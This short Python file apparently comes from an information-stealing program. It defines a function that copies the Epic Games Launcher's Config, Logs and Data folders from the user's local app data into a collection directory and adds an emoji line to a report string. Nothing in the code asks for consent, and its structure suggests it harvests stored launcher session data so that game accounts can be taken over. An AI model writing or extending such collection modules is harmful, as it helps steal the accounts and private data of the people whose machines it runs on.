from os import environ
from os.path import join
from shutil import copytree
from manager.logger import Log
from preferences.config import config


def Epic():
    try:
        msgInfo = ""
        local = join(environ["LOCALAPPDATA"], "EpicGamesLauncher", "Saved")
        pathToLogs = join(config.pathToLogs, "Games", "EpicGames")
        copytree(join(local, "Config"), join(pathToLogs, "Config"))
        copytree(join(local, "Logs"), join(pathToLogs, "Logs"))
        copytree(join(local, "Data"), join(pathToLogs, "Data"))
        msgInfo+="\n∟🎮EpicGames"
        return msgInfo
    except Exception as error:
        Log(f"EpicGames ---> {error}")
        return msgInfo